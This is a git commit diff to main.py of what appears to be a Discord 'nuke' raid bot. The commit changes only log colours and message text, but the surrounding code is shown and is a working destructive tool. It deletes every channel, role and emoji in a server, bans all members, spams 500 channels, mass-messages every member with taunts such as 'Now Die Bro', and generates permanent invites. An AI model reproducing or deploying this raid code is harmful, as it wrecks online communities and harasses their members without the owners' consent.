f74e0a8b973da3bdbd1bff462f05d26404b20e27
ItzBoiz <85618839+ItzBoiz@users.noreply.github.com>
2021-07-13 12:58:46 +0530

    Update main.py

--- main.py
+++ main.py
@@ -49,43 +49,43 @@ async def nuke(ctx):
     for channel in guild.channels:
       try:
         await channel.delete()
-        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
+        print(Fore.BLUE + f"{channel.name} was deleted." + Fore.RESET)
       except:
-        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
+        print(Fore.RED + f"{channel.name} was NOT deleted." + Fore.RESET)
     for member in guild.members:
      try:
        await member.ban()
-       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
+       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
      except:
-       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
+       print(Fore.RED + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
     for role in guild.roles:
      try:
        await role.delete()
-       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
+       print(Fore.GREEN + f"{role.name} Has been deleted" + Fore.RESET)
      except:
-       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
+       print(Fore.RED + f"{role.name} Has not been deleted" + Fore.RESET)
     for emoji in list(ctx.guild.emojis):
      try:
        await emoji.delete()
-       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
+       print(Fore.GREEN + f"{emoji.name} Was deleted" + Fore.RESET)
      except:
-       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
+       print(Fore.RED + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
     banned_users = await guild.bans()
     for ban_entry in banned_users:
       user = ban_entry.user
       try:
-        await user.unban("Obama's Step Son#1557")
-        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
+        await user.unban("TestUser#0001")
+        print(Fore.RED + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
       except:
         print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
-    await guild.create_text_channel("Sub To Astrotrek")
+    await guild.create_text_channel("Raid Raid Boombayah")
     for channel in guild.text_channels:
         link = await channel.create_invite(max_age = 0, max_uses = 0)
         print(f"New Invite: {link}")
     amount = 500
     for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
-    print(f"Nuked {guild.name} Successfully.")
+    print(f"Nuked {guild.name} Successfully!")
     return
 
 @client.command(pass_context=True)
@@ -105,9 +105,9 @@ async def ObamaMessage(ctx):
     for member in list(client.get_all_members()):
         await asyncio.sleep(0)
         try:
-            embed = discord.Embed(title="Sub To Astrotrek", description="Obama's Step Son ON TOP" , color=discord.Colour.purple())
+            embed = discord.Embed(title="How Was The Raid!?", description="Never Mess with Us." , color=discord.Colour.purple())
             embed.set_thumbnail(url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
-            embed.set_footer(text="Sub To Astrotrek")
+            embed.set_footer(text="Now Die Bro")
             await asyncio.sleep(3) # This is a delay on the command so the bot doesn't get rate limited, if you remove this the bot might get banned or rate limited
             await member.send(embed=embed)
         except:
@@ -139,8 +139,8 @@ async def ObamaHelp(ctx):
     await ctx.message.delete()
     await asyncio.sleep(0)
     try:
-            embed = discord.Embed(title="Made By Obama's Step Son#1557", description="Commands: \n \n .ObamaEmoji (deletes all emojis) \n **.Obama (main command)** \n .ObamaMessage (messages everyone in the server)  \n .ObamaRole (deletes all roles) \n .ObamaRename (renames everyone to whatever you specify) " , color=discord.Colour.purple())
-            embed.set_footer(text="Sub To Astrotrek")
+            embed = discord.Embed(title="BotHelp", description="Commands: \n \n .nuke (nukes this server) " , color=discord.Colour.purple())
+            embed.set_footer(text="kek")
             await ctx.author.send(embed=embed)
     except:
             pass
